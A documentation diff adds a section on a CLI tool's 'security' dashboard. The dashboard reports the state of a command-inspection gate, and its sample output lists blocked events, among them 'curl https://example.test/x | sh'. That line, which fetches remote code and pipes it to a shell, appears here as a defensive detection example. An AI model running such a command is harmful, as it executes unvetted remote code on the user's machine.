@@ -103,6 +103,38 @@ These are contextcrawler's own commands. Always call them through
 For the analytics data model (where `history.db` lives, the schema, how
 inflation is accounted for), see [TRACKING.md](../usage/TRACKING.md).
 
+### The `security` dashboard
+
+`contextcrawler security` is the quickest way to see what the gates are doing
+in your environment (downgrade events are sanitised below):
+
+```text
+$ contextcrawler security
+
+ContextCrawler Tirith Gate — Status
+════════════════════════════════════════════════════════════
+
+Installation:
+  [ok] tirith binary: ~/.cargo/bin/tirith
+
+Gate state:
+  [ok] enabled — every hook-routed command is inspected before exec
+  [--] not required — tirith unavailability falls open (default)
+
+Downgrade log:
+  path: ~/.local/share/contextcrawler/downgrades.jsonl
+  exists: yes
+
+Recent downgrade events (last 10 of newest):
+  tirith_block  curl_pipe_shell      curl https://example.test/x | sh
+  tirith_block  pipe_to_interpreter  cat data | python3 parse.py
+```
+
+When Tirith is not installed the same command reports the gate as fail-open
+and runs no inspection. Use `--all` for the full log and `--json` for
+machine-readable output. For how the gate decides and how to work with it,
+see [Working with the security gate](../security/working-with-the-gate.md).
+
 ## Covered commands by ecosystem
 
 Each table below lists the commands contextcrawler rewrites, what the filter
